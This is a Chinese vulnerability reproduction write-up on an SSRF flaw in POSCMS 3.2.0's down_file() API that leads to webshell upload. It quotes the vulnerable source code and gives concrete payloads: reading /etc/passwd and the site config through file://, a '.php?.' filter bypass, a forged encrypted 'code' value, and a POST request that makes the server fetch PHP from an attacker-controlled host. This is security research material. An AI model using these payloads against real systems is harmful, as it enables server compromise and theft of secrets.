POSCMS 3.2.0 ssrf漏洞getshell
=============================

一、漏洞简介
------------

二、漏洞影响
------------

POSCMS 3.2.0

三、复现过程
------------

打开项目源代码，第一个漏洞的出处在`\diy\module\member\controllers\Api.php`中的`down_file()`函数，内容如下：

    // 文件下载并上传
    public function down_file() {

        /***********************************************************
        * Part0. 获取POST参数url中的内容并解析
        ************************************************************/
        $p = array();
        $url = explode('&', $this->input->post('url'));

        foreach ($url as $t) {
        $item = explode('=', $t);
        $p[$item[0]] = $item[1];
        }

        /***********************************************************
        * Part1. 验证用户权限
        ************************************************************/
        !$this->uid && exit(dr_json(0, fc_lang('游客不允许上传附件')));

        // 会员组权限
        $member_rule = $this->get_cache('member', 'setting', 'permission', $this->member['mark']);

        // 是否允许上传附件
        !$this->member['adminid'] && !$member_rule['is_upload'] && exit(dr_json(0, fc_lang('您的会员组无权上传附件')));

        // 附件总大小判断
        if (!$this->member['adminid'] && $member_rule['attachsize']) {
        $data = $this->db->select_sum('filesize')->where('uid', $this->uid)->get('attachment')->row_array();
        $filesize = (int)$data['filesize'];
        $filesize > $member_rule['attachsize'] * 1024 * 1024 && exit(dr_json(0, fc_lang('附件空间不足！您的附件总空间%s，现有附件%s。', $member_rule['attachsize'].'MB', dr_format_file_size($filesize))));
        }

        /***********************************************************
        * Part2. 解密code参数的值获得扩展、路径等信息
        ************************************************************/    
        list($size, $ext, $path) = explode('|', dr_authcode($p['code'], 'DECODE'));

        /***********************************************************
        * Part3. 生成存放路径
        ************************************************************/    
        $path = $path ? SYS_UPLOAD_PATH.'/'.$path.'/' : SYS_UPLOAD_PATH.'/'.date('Ym', SYS_TIME).'/';
        !is_dir($path) && dr_mkdirs($path);

        $furl = $this->input->post('file');

        /***********************************************************
        * Part4. 访问并获取文件  
        ************************************************************/
        $file = dr_catcher_data($furl);
        !$file && exit(dr_json(0, '获取远程文件失败'));

        /***********************************************************
        * Part5. 根据扩展名过滤并存储数据  
        ************************************************************/
        $fileext = strtolower(trim(substr(strrchr($furl, '.'), 1, 10))); //扩展名
        $exts = (array)explode(',', $ext);
        !in_array($fileext, $exts) && exit(dr_json(0, '远程文件扩展名（'.$fileext.'）不允许'));
        $fileext == 'php' && exit(dr_json(0, '远程文件扩展名（'.$fileext.'）不允许'));

        $filename = substr(md5(time()), 0, 7).rand(100, 999);       //文件名

        /***********************************************************
        * Part6. 向路径写入数据并返回响应结果  
        ************************************************************/
        if (@file_put_contents($path.$filename.'.'.$fileext, $file)) {
            $info = array(
                'file_ext' => '.'.$fileext,
                'full_path' => $path.$filename.'.'.$fileext,
                'file_size' => filesize($path.$filename.'.'.$fileext)/1024,
                'client_name' => '',
            );
            $this->load->model('attachment_model');
            $this->attachment_model->siteid = $p['siteid'] ? $p['siteid'] : SITE_ID;
            $result = $this->attachment_model->upload($this->uid, $info);
            if (is_array($result)) {
                list($id) = $result;
                echo json_encode(array('status'=>1, 'id'=>$id, 'name' => dr_strcut($filename, 10).'.'.$fileext));exit;
            } else {
                @unlink($info['full_path']);
                exit(dr_json(0, $result));
            }
        } else {
            exit(dr_json(0, '文件移动失败，目录无权限（'.$path.'）'));
        }
    }

### 源码分析

这段代码的主要逻辑是**根据请求中参数去请求文件内容，并将它保存在特定目录中，最后以json格式返回保存结果**。

Part1没什么好说的，只要管理员不修改默认权限，注册个普通用户就有视频、图片的上传功能。Part2中`dr_authcode()`是一个加解密函数，位于`\diy\dayrui\helpers\function_helper.php`。其具体实现可以不用关心，毕竟源码已经到手，只要找到密钥，就能随意构造加密结果。

![1.png](/Users/aresx/Documents/VulWiki/.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId25.png)

Part3中确定了下载文件的名称，这里我们请求的参数中不包含`code`参数，使`$PATH为空`，则它会取问号表达式的后半段`SYS_UPLOAD_PATH.'/'.date('Ym', SYS_TIME).'/'`，最后的上传路径如下：`/uploadfile/年月/`。

![2.png](/Users/aresx/Documents/VulWiki/.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId26.png)

Part4中的`dr_catcher_data()`函数正是SSRF漏洞的来源，其实现位于`\diy\dayrui\helpers\function_helper.php`。无论代码最后选的是fopen模式还是curl模式，开发人员都没有对可解析的协议做限制，也没有校验请求参数`$url`的范围。

![3.png](/Users/aresx/Documents/VulWiki/.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId27.png)

### 寻找触发点

直接用VSCode的全局搜索功能，寻找`down_file()`函数的调用位置：

![4.png](/Users/aresx/Documents/VulWiki/.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId29.png)

发现它出现在了一个js文件中，于是构造一个XHR的POST请求到服务端，设置`file`参数的值使其访问`/etc/passwd`，得到如下响应：

![5.png](/Users/aresx/Documents/VulWiki/.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId30.png)

用浏览器打开"文件存储路径+返回的文件名"：

![6.png](/Users/aresx/Documents/VulWiki/.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId31.png)

### GetShell

再请求一下`/config/system.php`，该文件中存储有重要的元数据。

![7.png](/Users/aresx/Documents/VulWiki/.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId33.png)

这是因为Part5中的`$ext`变量虽然为空，但它专门过滤了.php文件，好在利用`file://`协议的解析特性，可以绕过这一点，比如`.php?.`或`.php#.`：

![8.png](/Users/aresx/Documents/VulWiki/.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId34.png)

再次用浏览器打开并设置编码格式为UTF-8：

![9.png](/Users/aresx/Documents/VulWiki/.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId35.png)

获取到安全密钥后，可以构造特殊payload绕过扩展名检查。这里，总结一下此次GetShell的思路：

1.  构造特殊payload使.html文件允许被上传
2.  在自己控制的服务器上放置.html文件（里面有恶意代码的php代码）
3.  利用SSRF漏洞，使服务器用http协议访问带外数据（OOB），获取到恶意的.html，形成Getshell

为了绕过扩展名检查，我将加密代码拷贝进另一文件并填入密钥，输入选择`1|html,|0`，运行得到输出为`22d7Qrdws88/R/uETpWlvY/PFNTYzvs/QNj5PBa66veNDlECqpM`，并构造POST参数`file=http://www.0-sec.org/haha.html&url=code=22d7Qrdws88/R/uETpWlvY/PFNTYzvs/QNj5PBa66veNDlECqpM`，这里的`haha.html`里包含了php代码`<?php echo phpinfo();?>`，最终效果如下：

![10.png](/Users/aresx/Documents/VulWiki/.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId36.png)

![11.png](/Users/aresx/Documents/VulWiki/.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId37.png)

如果这里复现失败了，那大概是在于两点：一、加密函数有时效性，过时需要重新生成；二、CentOS默认安装的Apache无法解析包含php代码的html文件，需要在`/etc/httpd/conf.d/php.conf`中添加如下：

![12.png](/Users/aresx/Documents/VulWiki/.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId38.png)

参考链接
--------

> https://xz.aliyun.com/t/4858\#toc-1
